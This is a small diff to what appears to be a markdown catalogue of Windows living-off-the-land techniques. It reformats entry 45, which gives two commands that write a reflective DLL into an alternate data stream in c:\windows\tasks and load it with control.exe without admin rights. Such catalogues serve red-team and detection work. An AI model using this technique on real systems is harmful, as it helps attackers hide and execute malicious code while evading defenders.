@@ -754,8 +754,10 @@ Notes:
    
 ## 45. Control.exe -Loading DLL/CPL binary from Alternate data stream
 
-```type notepad_reflective_x64.dll > c:\windows\tasks\zzz:notepad_reflective_x64.dll
-control.exe c:\windows\tasks\zzz:notepad_reflective_x64.dll```
+```
+type notepad_reflective_x64.dll > c:\windows\tasks\zzz:notepad_reflective_x64.dll
+control.exe c:\windows\tasks\zzz:notepad_reflective_x64.dll
+```
 
 * Requires admin: No  
 * Windows binary: Yes  
